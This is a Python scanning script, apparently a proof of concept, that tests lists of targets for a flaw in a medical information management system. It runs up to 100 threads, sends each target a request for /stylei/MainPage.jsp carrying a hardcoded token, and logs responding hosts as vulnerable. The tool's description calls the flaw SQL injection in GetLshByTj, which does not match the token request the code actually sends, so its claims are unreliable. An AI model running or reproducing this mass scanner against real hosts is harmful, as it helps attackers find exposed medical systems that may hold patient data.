import sys
import argparse
import requests
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def banner():
    banner = r"""
     .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  ____  ____  | || |     _____    | || |  _________   | || |  ________    | || |      __      | || |     ____     | || |      __      | |
| | |_  _||_  _| | || |    |_   _|   | || | |_   ___  |  | || | |_   ___ `.  | || |     /  \     | || |   .'    `.   | || |     /  \     | |
| |   \ \  / /   | || |      | |     | || |   | |_  \_|  | || |   | |   `. \ | || |    / /\ \    | || |  /  .--.  \  | || |    / /\ \    | |
| |    > `' <    | || |      | |     | || |   |  _|  _   | || |   | |    | | | || |   / ____ \   | || |  | |    | |  | || |   / ____ \   | |
| |  _/ /'`\ \_  | || |     _| |_    | || |  _| |___/ |  | || |  _| |___.' / | || | _/ /    \ \_ | || |  \  `--'  /  | || | _/ /    \ \_ | |
| | |____||____| | || |    |_____|   | || | |_________|  | || | |________.'  | || ||____|  |____|| || |   `.____.'   | || ||____|  |____|| |
| |              | || |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 


    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="医药信息管理系统GetLshByTj存在SQL注入")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/58.0.3029.110 Safari/537.36",
    }
    proxy = {
        "http": "127.0.0.1:8080",
        "https": "127.0.0.1:8080",
    }
    try:
        res1 = requests.get(url=target + payload, headers=headers, verify=False, timeout=5, proxies=proxy)
        if res1.status_code == 200 and "失效" not in res1.text:
            print(f"[+] {target} 存在漏洞")
            with open("xiedaoa.txt", 'a') as f:
                f.write(target + '\n')
                f.close()
            return True
        else:
            print(f"[-] {target} 不存在漏洞")
    except Exception as e:
        logger.error(f"[-] {target} 连接失败")
        return False


if __name__ == '__main__':
    main()
